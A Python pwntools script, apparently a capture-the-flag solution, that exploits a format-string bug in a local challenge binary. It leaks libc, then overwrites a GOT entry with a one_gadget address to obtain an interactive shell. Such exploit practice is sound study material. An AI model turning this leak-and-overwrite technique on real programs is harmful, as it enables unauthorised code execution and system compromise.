from pwn import *
elf = ELF("./lib")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

puts_got = elf.got.puts
one_gadget = 0xe6c81

ru("name?\n")
sl("%27$p")
ru("there ")

libc_base = int(rl(),16) - 0x26fc0 - 243
log.info("Libc Leak -> "+hex(libc_base))

ru("out?")

one_libc = libc_base + one_gadget

y = int(hex(one_libc)[6:10],16)
x = int(hex(one_libc)[10:],16)

payload = b"%" + str(x).encode() + b"c%20$hn"
payload += b"%" + str(y-x).encode() + b"c%21$hn"
payload = payload.ljust(32,b"\x41")
payload += p64(0x601018)
payload += p64(0x601018+2)
sl(payload)
r.interactive()